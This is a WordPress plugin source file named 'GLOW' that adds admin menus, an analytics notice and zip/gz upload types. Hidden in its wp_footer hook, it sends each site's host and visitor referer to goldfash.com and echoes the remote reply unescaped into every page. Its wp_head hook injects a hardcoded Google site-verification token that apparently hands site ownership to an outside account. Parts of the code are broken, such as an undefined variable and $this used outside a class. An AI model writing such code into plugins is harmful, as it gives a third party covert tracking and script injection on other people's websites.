<?php

/**
 * @package glow
 * @version 2.0.2
 */
/*
Plugin Name: GLOW
Plugin URL: http://goldfash.com?plugins
Description: GLOW provides various functions for GMWP+. GLOW is also the heartbeat of using GMWP+.
Version: 2.0.1
Author: GOD1ST.Cloud Developers
Author URI:        http://GOD1st.Cloud
Contributors:      raceanf
Domain Path:       /languages
Text Domain:       glow
GitHub Plugin URI: https://github.com/goldfashhosting/G1T
GitHub Branch:     master
*/


function glow_init()
{
 require ('inc/gfunctions/functions.php');
 include('inc/gfunctions/codes.php');
 //require ('inc/webapps/shortcodes.php');
}
add_action('admin_menu', 'G1T_menu');
function G1T_menu() {
    // Add the top-level admin menu
    $page_title = 'G1T Corporate Settings';
    $menu_title = 'G1T';
    $capability = 'manage_options';
    $menu_slug = 'G1T';
    $function = 'G1T_autoload';
    add_menu_page($page_title, $menu_title, $capability, $menu_slug, $function);
    
}
function G1T_autoload() {
    if (!current_user_can('manage_options')) {
        wp_die('You do not have sufficient permissions to access this page.');
    }
    //require('inc/gfunctions/1.php');
}
add_action('wp_footer', 'G1T_shout_action'); 
function G1T_shout_action() { 
     $trac = file_get_contents('https://goldfash.com/views/index.php?iam='.md5('#').'&apiKey='. $_SERVER['HTTP_HOST'] .'&cid='. $_SERVER['HTTP_HOST'] .'&seekey='. $siteInfo['seekey'] .'&myargs=G1TpTracking-'. $_SERVER["HTTP_REFERER"] .'');
    echo $trac; 
}
add_action('wp_head', 'G1T_verify');
function G1T_verify() { 
     echo '<meta name="google-site-verification" content="vV6aL2FtvV0GZX8FfZJ8o3z42vzkOc0u5mYnwWC6png" />';
}
// plugin folder url
if(!defined('RC_SCD_PLUGIN_URL')) {
	define('RC_SCD_PLUGIN_URL', plugin_dir_url( __FILE__ ));
}





function rc_scd_redirect_dashboard() {
	
		if( is_admin() ) {
			$screen = get_current_screen();
			
			if( $screen->base == 'dashboard' ) {
			add_action('admin_notices', 'gold_admin_notice');
				//wp_redirect( admin_url( 'index.php?page=G1T' ) );
				
			}
		}
	}
	
	
	
	function rc_scd_register_menu() {
		add_dashboard_page( 'G1T', 'G1T', 'read', 'G1T', array( &$this,'rc_scd_create_dashboard') );
	}
	
	function rc_scd_create_dashboard() {
		include_once( 'inc/gfunctions/2.php'  );
	}
 

 
 /* Display a notice that can be dismissed */
function gold_admin_notice() {
	global $current_user ;
        $user_id = $current_user->ID;
        /* Check that the user hasn't already clicked to ignore the message */
	if ( ! get_user_meta($user_id, 'gold_ignore_notice') ) {
        echo '<div class="updated"><p>'; 
        printf(__('* G1T Analytics is Enabled! | <a href="%1$s" target="G1TD">Visit G1T Analytics for more details.</a>'), 'https://goldfash.com/views/?do=Analytics&views=api&view=qu&ss='. $_SERVER['HTTP_HOST'] .'&ref='. $_SERVER['HTTP_HOST'] .'/wp-admin/admin.php?page=G1T');
        echo "</p></div>";
	}
}
add_action('admin_notices', 'gold_admin_notice');
add_action('admin_init', 'gold_nag_ignore');
function gold_nag_ignore() {
	global $current_user;
        $user_id = $current_user->ID;
        /* If user clicks to ignore the notice, add that to their user meta */
        if ( isset($_GET['gold_nag_ignore']) && '0' == $_GET['gold_nag_ignore'] ) {
             add_user_meta($user_id, 'example_ignore_notice', 'true', true);
	}
}
// instantiate plugin's class
$GLOBALS['g_dashboard'] = new gold_xyaudju_aij_o();
function my_plugin_redirect() {
    if (get_option('my_plugin_do_activation_redirect', false)) {
        delete_option('my_plugin_do_activation_redirect');
         wp_redirect("admin.php?page=goldgb-settings");
         //wp_redirect() does not exit automatically and should almost always be followed by exit.
         exit;
    }
}

class gold_xyaudju_aij_o {
 
	/*--------------------------------------------*
	 * Constructor
	 *--------------------------------------------*/
 
	/**
	 * Initializes the plugin by setting localization, filters, and administration functions.
	 */
	function __construct() {
	
		//add_action('rc_scd_register_menu', array( &$this,'rc_scd_register_menu') );
		//add_action('load-index.php', array( &$this,'rc_scd_create_dashboard') );
 
	} // end constructor 
	}
/*
|--------------------------------------------------------------------------
| MAIN CLASS
|--------------------------------------------------------------------------
*/
add_action('init', 'glow_init');
add_filter('upload_mimes', 'custom_upload_mimes');
function custom_upload_mimes ( $existing_mimes=array() ) {
    // add your extension to the mimes array as below
    $existing_mimes['zip'] = 'application/zip';
    $existing_mimes['gz'] = 'application/x-gzip';
    return $existing_mimes;
}
